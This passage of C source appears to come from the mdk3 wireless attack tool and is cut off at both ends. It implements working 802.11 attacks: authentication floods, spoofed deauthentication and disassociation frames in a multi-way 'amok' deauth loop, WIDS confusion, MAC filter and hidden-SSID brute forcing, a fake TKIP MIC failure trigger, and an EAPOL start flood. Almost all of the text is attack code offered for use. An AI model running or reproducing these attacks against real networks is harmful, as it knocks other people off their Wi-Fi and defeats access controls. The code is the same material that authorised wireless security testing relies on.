		// p[1] - xxxx xx00 => NoDS   p[4]-DST p[10]-SRC p[16]-BSS
		case 0:
		    src = pkt_auth + 10;
		    dst = pkt_auth + 4;
		    break;
		// p[1] - xxxx xx01 => ToDS   p[4]-BSS p[10]-SRC p[16]-DST
		case 1:
		    src = pkt_auth + 10;
		    dst = pkt_auth + 16;
		    break;
		// p[1] - xxxx xx10 => FromDS p[4]-DST p[10]-BSS p[16]-SRC
		case 2:
		    src = pkt_auth + 16;
		    dst = pkt_auth + 4;
		    break;
		// p[1] - xxxx xx11 => WDS    p[4]-RCV p[10]-TRM p[16]-DST p[26]-SRC
		case 3:
		    src = pkt_auth + 26;
		    dst = pkt_auth + 16;
		    break;
	    }

	    // Check if packet got relayed (source adress == fake mac)
	    search = search_data(current, src, ETHER_ADDR_LEN);
	    if (search != NULL) {
		ia_stats.d_relays++;
		break;
	    }

	    // Check if packet is an answer to an injected packet (destination adress == fake mac)
	    search = search_data(current, dst, ETHER_ADDR_LEN);
	    if (search != NULL) {
		ia_stats.d_responses++;
		break;
	    }

	    // If it's none of these, check if the maximum lenght is exceeded
	    if (data_size < max_data_size) {
		// Ignore WDS packets
		if ((pkt_auth[1] & 3) != 3) {
		    if (!we_got_data) {
			// Set we_got_data when we receive the first data packet, and initialize data list
			we_got_data = 1;
			init_clist(&a_data, pkt_auth, plen, plen);
		    } else {
			// Or add it to the a_data list
			a_data_current = add_to_clist(&a_data, pkt_auth, plen, plen);
			a_data_current = a_data_current->next;
		    }
		    // increase ia_stats captured counter & data_size
		    ia_stats.d_captured++;
		    data_size += plen;
		}
	    } else {
		if (!size_warning) {
		    printf("--------------------------------------------------------------\n");
		    printf("WARNING: mdk3 has now captured more than %ld MB of data packets\n", max_data_size / 1024 / 1024);
		    printf("         New data frames will be ignored to save memory!\n");
		    printf("--------------------------------------------------------------\n");
		    size_warning = 1;
		}
	    }

	default:
	    // Not interesting, count something??? Nah...
	    break;
	}
    }
}

//ATTACK Intelligent Auth Flood
struct pckt get_data_for_intelligent_auth_dos(unsigned char *mac)
{

    struct pckt retn;
    retn.data = NULL;
    retn.len = 0;

    unsigned char ds;
    unsigned char *dst = NULL;
    unsigned char dest[ETHER_ADDR_LEN];

    //Skip some packets for more variety
    a_data_current = a_data_current->next;
    a_data_current = a_data_current->next;

    //Copy packet out of the list
    memcpy(tmpbuf, a_data_current->data, a_data_current->status);

    //find DST to copy it
	ds = tmpbuf[1] & 3;		//Set first 6 bits to 0
	switch (ds) {
	// p[1] - xxxx xx00 => NoDS   p[4]-DST p[10]-SRC p[16]-BSS
	case 0:
		dst = tmpbuf + 4;
		break;
	// p[1] - xxxx xx01 => ToDS   p[4]-BSS p[10]-SRC p[16]-DST
	case 1:
		dst = tmpbuf + 16;
		break;
	// p[1] - xxxx xx10 => FromDS p[4]-DST p[10]-BSS p[16]-SRC
	case 2:
		dst = tmpbuf + 4;
		break;
	// p[1] - xxxx xx11 => WDS    p[4]-RCV p[10]-TRM p[16]-DST p[26]-SRC
	case 3:
		dst = tmpbuf + 16;
		break;
	}
    memcpy(dest, dst, ETHER_ADDR_LEN);

    //Set Target, DST, SRC and ToDS correctly
    memcpy(tmpbuf+4 , target, ETHER_ADDR_LEN);	//BSSID
    memcpy(tmpbuf+10, mac,    ETHER_ADDR_LEN);	//Source
    memcpy(tmpbuf+16, dest,   ETHER_ADDR_LEN);	//Destination

    tmpbuf[1] &= 0xFC;	// Clear DS field
    tmpbuf[1] |= 0x01;	// Set ToDS bit

    //Return it to have fun with it
    retn.data = tmpbuf;
    retn.len = a_data_current->status;

    return retn;

}

//ATTACK WIDS
void wids_sniffer()
{
    int plen;
    struct beaconinfo bi;
    struct clistwidsap *belongsto;
    struct clistwidsclient *search;

    while (1) {
	plen = osdep_read_packet(pkt_sniff, MAX_PACKET_LENGTH);

	switch (pkt_sniff[0]) {
	case 0x80: //Beacon frame
	    bi = parse_beacon(pkt_sniff, plen);
	    //if (bi.ssid_len != essid_len) break; //Avoid segfaults
	    if (zc_exploit) { //Zero_Chaos connects to foreign APs
		if (! memcmp(essid, bi.ssid, essid_len)) { //this is an AP inside the WDS, we just add him to the list
		    if (!init_zc_own) {
			init_clistwidsap(&zc_own, bi.bssid, bi.channel, ETHER_ADDR_LEN, bi.capa[0], bi.capa[1]);
			init_zc_own = 1;
		    } else {
			if (search_bssid(zc_own_cur, bi.bssid, ETHER_ADDR_LEN) != NULL) break; //AP is known
			add_to_clistwidsap(zc_own_cur, bi.bssid, bi.channel, ETHER_ADDR_LEN, bi.capa[0], bi.capa[1]);
			printf("\rFound WDS AP: %02X:%02X:%02X:%02X:%02X:%02X on channel %d           \n", bi.bssid[0], bi.bssid[1], bi.bssid[2], bi.bssid[3], bi.bssid[4], bi.bssid[5], bi.channel);
		    }
		break;
		}
	    } else { //But ASPj's attack does it this way!
		if (memcmp(essid, bi.ssid, essid_len)) break; //SSID doesn't match
	    }

	    if (!init_aplist) {
		init_clistwidsap(&clwa, bi.bssid, bi.channel, ETHER_ADDR_LEN, bi.capa[0], bi.capa[1]);
		init_aplist = 1;
	    } else {
		if (search_bssid(clwa_cur, bi.bssid, ETHER_ADDR_LEN) != NULL) break; //AP is known
		add_to_clistwidsap(clwa_cur, bi.bssid, bi.channel, ETHER_ADDR_LEN, bi.capa[0], bi.capa[1]);
	    }
	    wids_stats.aps++;
	    if (zc_exploit) {
		printf("\rFound foreign AP: %02X:%02X:%02X:%02X:%02X:%02X on channel %d           \n", bi.bssid[0], bi.bssid[1], bi.bssid[2], bi.bssid[3], bi.bssid[4], bi.bssid[5], bi.channel);
	    } else {
		printf("\rFound AP: %02X:%02X:%02X:%02X:%02X:%02X on channel %d           \n", bi.bssid[0], bi.bssid[1], bi.bssid[2], bi.bssid[3], bi.bssid[4], bi.bssid[5], bi.channel);
	    }
	break;

	case 0x08: //Data frame
	    if (!init_aplist) break; // If we have found no AP yet, we cannot find any clients belonging to it
	    unsigned char ds = pkt_sniff[1] & 3;	//Set first 6 bits to 0
	    unsigned char *bss = NULL;
	    unsigned char *client = NULL;
	    switch (ds) {
	    // p[1] - xxxx xx00 => NoDS   p[4]-DST p[10]-SRC p[16]-BSS
	    case 0:
		bss = pkt_sniff + 16;
		client = NULL;	//Ad-hoc network packet - Useless for WIDS
		break;
	    // p[1] - xxxx xx01 => ToDS   p[4]-BSS p[10]-SRC p[16]-DST
	    case 1:
		bss = pkt_sniff + 4;
		client = pkt_sniff + 10;
		break;
	    // p[1] - xxxx xx10 => FromDS p[4]-DST p[10]-BSS p[16]-SRC
	    case 2:
		bss = pkt_sniff + 10;
		client = pkt_sniff + 4;
		break;
	    // p[1] - xxxx xx11 => WDS    p[4]-RCV p[10]-TRM p[16]-DST p[26]-SRC
	    case 3:
		bss = pkt_sniff + 10;
		client = NULL;  //Intra-Distribution-System WDS packet - useless, no client involved
		break;
	    }
	    if (client == NULL) break;  // Drop useless packets
	    belongsto = search_bssid(clwa_cur, bss, ETHER_ADDR_LEN);
	    if (zc_exploit) {
		if (belongsto != NULL) break; //Zero: this client does NOT belong to target WDS, drop it
		belongsto = search_bssid(zc_own_cur, bss, ETHER_ADDR_LEN);
		if (belongsto == NULL) break; //Zero: Don't know that AP, drop
	    } else {
		if (belongsto == NULL) break; //ASPj: client is NOT in our WDS -> drop
	    }

	    if (!init_clientlist) {
		init_clistwidsclient(&clwc, client, 0, ETHER_ADDR_LEN, pkt_sniff, plen, belongsto);
		init_clientlist = 1;
	    } else {
		if (search_client(clwc_cur, client, ETHER_ADDR_LEN) != NULL) break; //Client is known
		add_to_clistwidsclient(clwc_cur, client, 0, ETHER_ADDR_LEN, pkt_sniff, plen, belongsto);
	    }


	    wids_stats.clients++;
    	    printf("\rFound Client: %02X:%02X:%02X:%02X:%02X:%02X on AP %02X:%02X:%02X:%02X:%02X:%02X           \n", client[0], client[1], client[2], client[3], client[4], client[5], belongsto->bssid[0], belongsto->bssid[1], belongsto->bssid[2], belongsto->bssid[3], belongsto->bssid[4], belongsto->bssid[5]);
	break;

	case 0xB0:  // Authentication Response
	    search = search_client(clwc_cur, pkt_sniff + 4, ETHER_ADDR_LEN);
	    if (search == NULL) break;
	    if (search->status < 1) {	//prevent problems since many APs send multiple responses
		search->status = 1;
		search->retry = 0;
	    }
	break;

	case 0x10:  // Association Response
	    search = search_client(clwc_cur, pkt_sniff + 4, ETHER_ADDR_LEN);
	    if (search == NULL) break;
	    if (search->status < 2) {	//prevent problems since many APs send multiple responses
		search->status = 2;
		search->retry = 0;
		printf("\rConnected Client: %02X:%02X:%02X:%02X:%02X:%02X on AP %02X:%02X:%02X:%02X:%02X:%02X           \n", pkt_sniff[4], pkt_sniff[5], pkt_sniff[6], pkt_sniff[7], pkt_sniff[8], pkt_sniff[9], pkt_sniff[16], pkt_sniff[17], pkt_sniff[18], pkt_sniff[19], pkt_sniff[20], pkt_sniff[21]);
	    }
	break;

	case 0xC0:  // Deauthentication
	case 0xA0:  // Disassociation
	    search = search_client(clwc_cur, pkt_sniff + 4, ETHER_ADDR_LEN);
	    if (search == NULL) break;
	    wids_stats.deauths++;
	break;

        }
    }
}

//ATTACK WIDS
struct pckt get_data_for_wids(struct clistwidsclient *cli)
{

    struct pckt retn;
    retn.data = NULL;
    retn.len = 0;

    unsigned char ds;
    unsigned char *dst = NULL;
    unsigned char dest[ETHER_ADDR_LEN];

    //Copy packet out of the list
    memcpy(tmpbuf, cli->data, cli->data_len);

    //find DST to copy it
	ds = tmpbuf[1] & 3;		//Set first 6 bits to 0
	switch (ds) {
	// p[1] - xxxx xx00 => NoDS   p[4]-DST p[10]-SRC p[16]-BSS
	case 0:
		dst = tmpbuf + 4;
		break;
	// p[1] - xxxx xx01 => ToDS   p[4]-BSS p[10]-SRC p[16]-DST
	case 1:
		dst = tmpbuf + 16;
		break;
	// p[1] - xxxx xx10 => FromDS p[4]-DST p[10]-BSS p[16]-SRC
	case 2:
		dst = tmpbuf + 4;
		break;
	// p[1] - xxxx xx11 => WDS    p[4]-RCV p[10]-TRM p[16]-DST p[26]-SRC
	case 3:
		dst = tmpbuf + 16;
		break;
	}
    memcpy(dest, dst, ETHER_ADDR_LEN);

    //Set Target, DST, SRC and ToDS correctly
    memcpy(tmpbuf+4 , cli->bssid->bssid, ETHER_ADDR_LEN);	//BSSID
    memcpy(tmpbuf+10, cli->mac, ETHER_ADDR_LEN);	//Source
    memcpy(tmpbuf+16, dest, ETHER_ADDR_LEN);	//Destination

    tmpbuf[1] &= 0xFC;	// Clear DS field
    tmpbuf[1] |= 0x01;	// Set ToDS bit

    //Return it to have fun with it
    retn.data = tmpbuf;
    retn.len = cli->data_len;

    return retn;

}

//ATTACK MAC filter bruteforce
void mac_bruteforce_sniffer()
{
    int plen = 0;
    int interesting_packet;
    static unsigned char last_mac[6] = "\x00\x00\x00\x00\x00\x00";
//    static unsigned char ack[10] = "\xd4\x00\x00\x00\x00\x00\x00\x00\x00\x00";

   while(1) {
      do {
	interesting_packet = 1;
	//Read packet
	plen = osdep_read_packet(pkt_sniff, MAX_PACKET_LENGTH);
	//is this an auth response packet?
	if (pkt_sniff[0] != 0xb0) interesting_packet = 0;
	//is it from our target
	if (! is_from_target_ap(target, pkt_sniff)) interesting_packet = 0;
	//is it a retry?
	if (! memcmp(last_mac, pkt_sniff+4, 6)) interesting_packet = 0;
      } while (! interesting_packet);
      //Buffering MAC to drop retry frames later
      memcpy(last_mac, pkt_sniff+4, 6);

      //SPEEDUP: (Doesn't work??) Send ACK frame to prevent AP from blocking the channel with retries
/*      memcpy(ack+4, target, 6);
      osdep_send_packet(ack, 10);
*/

      //Set has_packet
      has_packet_really = 1;
      //Send condition
      pthread_cond_signal(&has_packet);
      //Wait for packet to be cleared
      pthread_cond_wait (&clear_packet, &clear_packet_mutex);
    }

}

/* Packet Generators */

struct pckt create_beacon_frame(char *ssid, int chan, int wep, int random_mac, int gmode, int adhoc, int advanced)
{
// Generate a beacon frame

    struct pckt retn;
    char *hdr =	"\x80\x00\x00\x00\xff\xff\xff\xff\xff\xff\x00\x00\x00\x00\x00\x00"
		"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
		"\x64\x00\x05\x00\x00";

    char param1[12];
    int modelen;
    struct advap fakeap;

    // GCC Warning avoidance
    fakeap.ssid = NULL;

    if (advanced) fakeap = get_fakeap_from_file();

    if(gmode) {
	//1-54 Mbit
	memcpy(&param1, "\x01\x08\x82\x84\x8b\x96\x24\x30\x48\x6c\x03\x01", 12);
	modelen = 12;
    }
    else {
	//1-11 Mbit
	memcpy(&param1, "\x01\x04\x82\x84\x8b\x96\x03\x01", 8);
	modelen = 8;
    }

    char *param2 = "\x04\x06\x01\x02\x00\x00\x00\x00\x05\x04\x00\x01\x00\x00";
    //WPA-TKIP Tag
    char *wpatkip = "\xDD\x18\x00\x50\xF2\x01\x01\x00\x00\x50\xF2\x02\x01\x00\x00\x50\xF2\x02\x01\x00\x00\x50\xF2\x02\x00\x00";
    //WPA-AES Tag
    char *wpaaes = "\xDD\x18\x00\x50\xF2\x01\x01\x00\x00\x50\xF2\x04\x01\x00\x00\x50\xF2\x04\x01\x00\x00\x50\xF2\x02\x00\x00";

    int slen;
    unsigned char *mac;

    //Getting SSID from file if file mode is in use
    if (advanced) {
	ssid = fakeap.ssid;
    } else {
	if (!(ssid_file_name == NULL)) ssid = read_line_from_file(0);
    }
    //Need to generate SSID or is one given?
    if (ssid == NULL) ssid = generate_ssid();
    slen = strlen(ssid);
    //Checking SSID lenght
    if (slen>32 && showssidwarn1) {
	printf("\rWARNING! Sending non-standard SSID > 32 bytes\n");
	showssidwarn1 = 0;
    }
    if (slen>255) {
	if (showssidwarn2) {
	    printf("\rWARNING! Truncating overlenght SSID to 255 bytes!\n");
	    showssidwarn2 = 0;
	}
	slen = 255;
    }
    // Setting up header
    memcpy(pkt, hdr, 36);
    // Set mode and WEP bit if wanted
    if(adhoc) {
        if(wep) pkt[34]='\x12';
        else pkt[34]='\x02';
    }
    else {
        if(wep) pkt[34]='\x11';
        else pkt[34]='\x01';
    }
    // Set random mac
    if (advanced) {
	mac = fakeap.mac;
    } else {
	if (random_mac) mac = generate_mac(0);
	    else mac = generate_mac(2);
    }
    memcpy(pkt+10, mac.ether_addr_octet, ETHER_ADDR_LEN);
    memcpy(pkt+16, mac.ether_addr_octet, ETHER_ADDR_LEN);
    // Set SSID
    pkt[37] = (unsigned char) slen;
    memcpy(pkt+38, ssid, slen);
    // Set Parameters 1
    memcpy(pkt+38+slen, param1, modelen);
    // Set Channel
    pkt[38+slen+modelen] = chan;
    // Set Parameters 2
    memcpy(pkt+39+slen+modelen, param2, 14);
    //Set WPA tag
    if(wep == 2) {	//If TKIP
        memcpy(pkt+53+slen+modelen, wpatkip, 26);
        modelen += 26;	//Let's just reuse the variable from 'gmode'.
    }
    else if(wep == 3) {	//If AES
        memcpy(pkt+53+slen+modelen, wpaaes, 26);
        modelen += 26;
   }

    retn.data = pkt;
    retn.len = slen+53+modelen;

    return retn;
}

struct pckt create_auth_frame(unsigned char *ap, int random_mac, unsigned char *client_mac)
{
// Generating an authentication frame

    struct pckt retn;
    char *hdr = "\xb0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
		"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00";
    unsigned char *mac;

    memcpy(pkt, hdr, 31);
    // Set target AP
    memcpy(pkt+4, ap, ETHER_ADDR_LEN);
    memcpy(pkt+16,ap, ETHER_ADDR_LEN);
    // Set client MAC
    if (client_mac == NULL) {
	if (random_mac) mac = generate_mac(0);
	    else mac = generate_mac(1);
	memcpy(pkt+10,mac.ether_addr_octet,ETHER_ADDR_LEN);
    } else {
	memcpy(pkt+10,client_mac,ETHER_ADDR_LEN);
    }
    retn.len = 30;
    retn.data = pkt;

    return retn;
}

struct pckt create_probe_frame(char *ssid, struct pckt mac, unsigned char *dest)
{
// Generating Probe Frame

    struct pckt retn;
    char *hdr = "\x40\x00\x00\x00";
    char *bcast = "\xff\xff\xff\xff\xff\xff";
    char *seq = "\x00\x00\x00";
    char *rates = "\x01\x04\x82\x84\x8b\x96";
    int slen;

    slen = strlen(ssid);

    memcpy(pkt, hdr, 4);
    if (dest == NULL) {
	// Destination: Broadcast
	memcpy(pkt+4, bcast, ETHER_ADDR_LEN);
    } else {
	memcpy(pkt+4, dest, ETHER_ADDR_LEN);
    }
    // MAC which is probing
    memcpy(pkt+10, mac.data, ETHER_ADDR_LEN);
    if (dest == NULL) {
	// BSSID: Broadcast
	memcpy(pkt+16, bcast, ETHER_ADDR_LEN);
    } else {
	memcpy(pkt+16, dest, ETHER_ADDR_LEN);
    }
    // Sequence
    memcpy(pkt+22, seq, 3);
    // SSID
    pkt[25] = slen;
    memcpy(pkt+26, ssid, slen);
    // Supported Bitrates (1, 2, 5.5, 11 MBit)
    memcpy(pkt+26+slen, rates, ETHER_ADDR_LEN);

    retn.data = pkt;
    retn.len = 26 + slen + ETHER_ADDR_LEN;

    return retn;
}

struct pckt create_deauth_frame(unsigned char *mac_sa, unsigned char *mac_da, unsigned char *mac_bssid, int disassoc)
{
// Generating deauthentication or disassociation frame

    struct pckt retn;           //DEST              //SRC
    char *hdr = "\xc0\x00\x3a\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
		 //BSSID             //SEQ  //Reason:unspec
		"\x00\x00\x00\x00\x00\x00\x70\x6a\x01\x00";

    memcpy(pkt, hdr, 25);
    if (disassoc) pkt[0] = '\xa0';
    // Set target Dest, Src, BSSID
    memcpy(pkt+4, mac_da, ETHER_ADDR_LEN);
    memcpy(pkt+10,mac_sa, ETHER_ADDR_LEN);
    memcpy(pkt+16,mac_bssid, ETHER_ADDR_LEN);

    retn.len = 26;
    retn.data = pkt;

    return retn;
}

struct pckt create_assoc_frame_simple(unsigned char *ap, unsigned char *mac, unsigned char *capability, unsigned char *ssid, int ssid_len)
{

  struct pckt retn;
  retn.data = pkt;
  retn.len = 0;

  //Association Request Header
  memset(retn.data, '\x00', 4);

  //Destination = AP
  memcpy(retn.data+4, ap, ETHER_ADDR_LEN);

  //Source
  memcpy(retn.data+10, mac, ETHER_ADDR_LEN);

  //BSSID
  memcpy(retn.data+16, ap, ETHER_ADDR_LEN);

  //Sequence + Fragments
  memset(retn.data+22, '\x00', 2);

  //Capabilities (should be copied from beacon frame to be compatible to the AP)
  memcpy(retn.data+24, capability, 2);

  //Listen Interval (Hardcoded 0a 00) + SSID Tag (00)
  memcpy(retn.data+26, "\x0a\x00\x00", 3);

  //SSID
  retn.data[29] = (unsigned char) ssid_len;
  memcpy(retn.data+30, ssid, ssid_len);
  retn.len = 30 + ssid_len;

  //Supported Rates / Extended Rates
  memcpy(retn.data + retn.len, SUPP_RATES, 10);
  retn.len += 10;
  memcpy(retn.data + retn.len, EXT_RATES, 6);
  retn.len += 6;

  return retn;
}

struct pckt amok_machine(char *filename)
{
    // FSM for multi-way deauthing
    static time_t t_prev = 0;

    switch (state) {
	case 0:
	    newone:

	    if (wblist) {			//Periodically re-read list every LIST_REREAD_PERIOD sec.
		if (t_prev == 0) {
		    printf("Periodically re-reading blacklist/whitelist every %d seconds\n\n", LIST_REREAD_PERIOD);
		}
		if (time(NULL) - t_prev >= LIST_REREAD_PERIOD) {
		    t_prev = time( NULL );
		    load_whitelist(filename);
		}
	    }

	    pkt_amok = get_target_deauth();
	    if ((pkt_amok[1] & '\x01') && (pkt_amok[1] & '\x02')) {	// WDS packet
		mac_sa = pkt_amok + 4;
		mac_ta = pkt_amok + 10;
		wds = 1;
	    }
	    else if (pkt_amok[1] & '\x01') {		// ToDS packet
		mac_ta = pkt_amok + 4;
		mac_sa = pkt_amok + 10;
		wds = 0;
	    }
	    else if (pkt_amok[1] & '\x02') {		// FromDS packet
		mac_sa = pkt_amok + 4;
		mac_ta = pkt_amok + 10;
		wds = 0;
	    }
	    else if ((!(pkt_amok[1] & '\x01')) && (!(pkt_amok[1] & '\x02'))) {	//AdHoc packet
		mac_sa = pkt_amok + 10;
		mac_ta = pkt_amok + 16;
		wds = 0;
	    }
	    else {
		goto newone;
	    }

	    if (wblist == 2) {			//Using Blacklist mode - Skip if neither Client nor AP is in list
		if (!(is_whitelisted(mac_ta)) && !((is_whitelisted(mac_sa))))
		    goto newone;
	    }
            if (wblist == 1) {			//Using Whitelist mode - Skip if Client or AP is in list
		if (is_whitelisted(mac_ta)) goto newone;
		if (is_whitelisted(mac_sa)) goto newone;
	    }

	    state = 1;
	    return create_deauth_frame(mac_ta, mac_sa, mac_ta, 1);
	case 1:
	    state = 2;
	    if (wds) state = 4;
	    return create_deauth_frame(mac_ta, mac_sa, mac_ta, 0);
	case 2:
	    state = 3;
	    return create_deauth_frame(mac_sa, mac_ta, mac_ta, 1);
	case 3:
	    state = 0;
	    return create_deauth_frame(mac_sa, mac_ta, mac_ta, 0);
	case 4:
	    state = 5;
	    return create_deauth_frame(mac_sa, mac_ta, mac_sa, 1);
	case 5:
	    state = 0;
	    return create_deauth_frame(mac_sa, mac_ta, mac_sa, 0);
	}

    // We can never reach this part of code unless somebody messes around with memory
    // But just to make gcc NOT complain...
    return create_deauth_frame(mac_sa, mac_ta, mac_sa, 0);
}

struct pckt ssid_brute()
{
    struct pckt pkt, retn;
    pthread_t sniffer;
    char *ssid;
    unsigned char *genmac;

    // GCC Warning avoidance
    pkt.data = NULL;
    pkt.len = 0;

    if (state == 0) {
//state0
//- SPAWN Sniffer thread
	pthread_create( &sniffer, NULL, (void *) ssid_brute_sniffer, (void *) 1);
//- sniff beacon frame from target / do nothin if target==NULL
	if (target != NULL) {
	    pkt = get_target_ssid();
//- set lenght variable
	    ssid_len = pkt.len;
	    if (ssid_len == 1)
		ssid_len = 0;	//Compensate for 1-byte placeholder SSIDs
//- set state1
	    state = 1;
//-> return probe packet using the SSID supplied by beacon frame
	    genmac = generate_mac(1);
	    retn = create_probe_frame((char *)pkt.data, genmac, NULL);
	    free(genmac);
	    return retn;
	}
//- In untargetted mode, continue
	state = 1;
    }

    if (state == 1) {
//state1
	newssid:
//- read SSID from file
	ssid = read_line_from_file(0);
//- if lenght!=0, continue to next one if length does not match
	if (ssid_len != 0) if ((unsigned int) ssid_len != strlen(ssid)) goto newssid;
//- Stop work if EOF is reached
	if (ssid_eof) {
	    printf("\nEnd of SSID list reached.\n");
	    exit_now = 1;
	}
//-> return packet containing SSID
	genmac = generate_mac(1);
	retn = create_probe_frame(ssid, genmac, NULL);
	free(genmac);
	return retn;
    }

    return pkt;
}

struct pckt ssid_brute_real()
{
    struct pckt pkt, retn;
    pthread_t sniffer;
    char *ssid;
    unsigned char *genmac;
    static int unknown_len = 0;

    // GCC Warning avoidance
    pkt.data = NULL;
    pkt.len = 0;

    if (state == 0) {
//state0
//- SPAWN Sniffer thread
	pthread_create( &sniffer, NULL, (void *) ssid_brute_sniffer, (void *) 1);
//- sniff beacon frame from target / do nothin if target==NULL
	if (target != NULL) {
	    pkt = get_target_ssid();
//- set lenght variable
	    ssid_len = pkt.len;

	    if ((ssid_len == 1) || (ssid_len == 0)) {
		ssid_len = 1;    //Compensate 0 and 1-byte placeholder SSIDs as maximum len
		unknown_len = 1;
	    }
//- set state1
	    state = 1;
//-> return probe packet using the SSID supplied by beacon frame
	    genmac = generate_mac(1);
	    retn = create_probe_frame((char *)pkt.data, genmac, NULL);
	    free(genmac);
	    return retn;
	}
//- In untargetted mode, continue
	state = 1;
    }

    if (state == 1) {
//state1
//- get SSID to probe for
	bruteforce_ssid();
	ssid = brute_ssid;
//- Stop work if last SSID is generated and sent
	if (end) {
	    if (unknown_len) {
		printf("\nAll %d possible SSIDs with length %d sent, trying length %d.\n", turns-1, ssid_len, ssid_len+1);
		end = 0; turns = 0; //Resetting bruteforce counters, trying one byte more
		memset(brute_ssid, 0, (256 * sizeof(char)));
		ssid_len++;
            } else {
		if (max_permutations) printf("\nall %d possible SSIDs sent.\n", turns-1);
		else printf("\nall %d possible SSIDs sent.\n", max_permutations);
		exit_now = 1;
	    }
	}
//-> return packet containing SSID
	genmac = generate_mac(1);
	retn = create_probe_frame(ssid, genmac, NULL);
	free(genmac);
	return retn;
    }

    return pkt;

}

struct pckt false_tkip(unsigned char *target)
{
    struct pckt michael, src;
    int length, i, prio;

    if (useqosexploit) {
	printf("Waiting for one QoS Data Packet...\n");

	while(1) {
	    length = osdep_read_packet(pkt_sniff, MAX_PACKET_LENGTH);
	    //QoS?
	    if (pkt_sniff[0] != 0x88) continue;
	    //ToDS?
	    if (! (pkt_sniff[1] & 0x01)) continue;
	    //And not WDS?
	    if (pkt_sniff[1] & 0x02) continue;
	    //From our target?
	    if (target == NULL) break;
	    if (memcmp(pkt_sniff+4, target, ETHER_ADDR_LEN)) continue;
	    break;
	}

	unsigned char *mac = pkt_sniff + 4;

	printf("QoS PACKET to %02X:%02X:%02X:%02X:%02X:%02X with Priority %d! Reinjecting...\n", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5], pkt_sniff[24]);
//	print_packet(pkt_sniff, length);

	prio = pkt_sniff[24];

	for (i=0; i < 3 ; i++) {
	    if (prio == i) continue;
	    pkt_sniff[24] = i;
	    osdep_send_packet(pkt_sniff, length);
	}

	i++;
	michael.data = pkt_sniff;
	michael.len = length;

	return michael;

    } else {
	// length = (rand() % 246) + 20;
	length = 32;
	src = generate_mac(0);
    
	src[0] = 0x00;
    
	michael.len = length + 32;
	michael.data = (unsigned char*) malloc(michael.len);
	memcpy(michael.data, MICHAEL, 32);
	memcpy(michael.data+4, target, ETHER_ADDR_LEN);
	memcpy(michael.data+10, src, ETHER_ADDR_LEN);
	memcpy(michael.data+16, target, ETHER_ADDR_LEN);
	free(src);

	//random extended IV
	michael.data[24] = rand() & 0xFF;
	michael.data[25] = rand() & 0xFF;
	michael.data[26] = rand() & 0xFF;
    
	//random data
	for(i=0; i<length; i++) {
	    michael.data[i+32] = rand() & 0xFF;
	}
    }

    return michael;
}

struct pckt create_assoc_frame(unsigned char *ssid, int ssid_len, unsigned char *ap, unsigned char *sta, int auth_flag, int ucast_flag, int mcast_flag)
{
  struct pckt retn;
  int ofs = 0;
  char *hdr = "\x00\x00\x3a\x01"     // type, fc, duration
	"\x00\x00\x00\x00\x00\x00"   // da
	"\x00\x00\x00\x00\x00\x00"   // sa
	"\x00\x00\x00\x00\x00\x00"   // bssid
	"\x00\xa6"                   // frag, seq
	"\x31\x05\x0a\x00"           // caps
	"\x00";                      // ssid tag

  memcpy(pkt, hdr, 29);
  memcpy(pkt + 4, ap, ETHER_ADDR_LEN);            // set AP
  memcpy(pkt + 10, sta, ETHER_ADDR_LEN);          // set STA
  memcpy(pkt + 16, ap, ETHER_ADDR_LEN);           // set BSSID
  pkt[29] = ssid_len;                // set SSID len
  memcpy(pkt + 30, ssid, ssid_len);  // set SSID
  ofs = 30 + ssid_len;
  memcpy(pkt + ofs, SUPP_RATES, 10); // set supported rates
  ofs += 10;
  memcpy(pkt + ofs, EXT_RATES, 6);   // set extended rates
  ofs += 6;

  if (auth_flag == FLAG_AUTH_WPA) {
    pkt[ofs] = 0xdd;                 // set VSA id
    pkt[ofs + 1] = 22;               // set len
    ofs += 2;
    memcpy(pkt + ofs, IE_WPA, 6);    // set WPA IE
    ofs += 6;

    // set multicast cipher stuff
    switch (mcast_flag) {
      case FLAG_TKIP:
        memcpy(pkt + ofs, IE_WPA_TKIP, 4);
        break;
      case FLAG_CCMP:
        memcpy(pkt + ofs, IE_WPA_CCMP, 4);
        break;
    }

    // set number of unicast ciphers (1)
    pkt[ofs + 4] = 0x01;
    pkt[ofs + 5] = 0x00;
    ofs += 6;

    // set unicast cipher stuff
    switch (ucast_flag) {
      case FLAG_TKIP:
        memcpy(pkt + ofs, IE_WPA_TKIP, 4);
        break;
      case FLAG_CCMP:
        memcpy(pkt + ofs, IE_WPA_CCMP, 4);
        break;
    }

    // set number of auth key management suites (1)
    pkt[ofs + 4] = 0x01;
    pkt[ofs + 5] = 0x00;
    ofs += 6;
    memcpy(pkt + ofs, IE_WPA_KEY_MGMT, 4);
    ofs += 4;

  } // FLAG_AUTH_WPA


  if (auth_flag == FLAG_AUTH_RSN) {
    memcpy(pkt + ofs, IE_RSN, 4);    // set RSN IE
    ofs += 4;

    // set multicast cipher stuff
    switch (mcast_flag) {
      case FLAG_TKIP:
        memcpy(pkt + ofs, IE_RSN_TKIP, 4);
        break;
      case FLAG_CCMP:
        memcpy(pkt + ofs, IE_RSN_CCMP, 4);
        break;
    }

    // set number of unicast ciphers (1)
    pkt[ofs + 4] = 0x01;
    pkt[ofs + 5] = 0x00;
    ofs += 6;

    // set unicast cipher stuff
    switch (ucast_flag) {
      case FLAG_TKIP:
        memcpy(pkt + ofs, IE_RSN_TKIP, 4);
        break;
      case FLAG_CCMP:
        memcpy(pkt + ofs, IE_RSN_CCMP, 4);
        break;
    }

    // set number of auth key management suites (1)
    pkt[ofs + 4] = 0x01;
    pkt[ofs + 5] = 0x00;
    ofs += 6;
    memcpy(pkt + ofs, IE_RSN_KEY_MGMT, 4);
    ofs += 4;

  } // FLAG_AUTH_RSN

  retn.len = ofs;
  retn.data = pkt;

  return retn;
}

struct pckt eapol_machine(char *ssid, int ssid_len, unsigned char *target, int flag_wtype, int flag_ucast, int flag_mcast)
{
  struct pckt retn;
  int co, flag, len;
  int wait_max_frames = 50;

  // GCC Warning avoidance
  retn.data = NULL;
  retn.len = 0;

retry:

  // FSM: auth => assoc => eapol start flood

  switch (eapol_state) {

    // assoc
    case 0:
      // create a random auth frame
      retn = create_auth_frame(target, 0, NULL);
      // save STA MAC for later purposes
      memcpy(eapol_src, retn.data + 10, 6);
